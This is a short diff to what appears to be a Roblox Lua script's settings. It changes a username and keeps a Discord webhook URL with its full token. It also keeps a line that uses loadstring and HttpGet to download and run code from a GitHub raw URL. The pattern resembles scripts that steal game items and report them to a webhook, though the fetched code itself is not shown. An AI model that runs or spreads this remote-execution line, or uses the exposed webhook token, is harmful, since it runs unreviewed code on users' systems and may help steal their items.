@@ -1,4 +1,4 @@
-username = "seanjacob_boto"
+username = "Jhaverick21"
 webhook = "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Zeus-Scripts/main/refs/heads/main/gag"))()
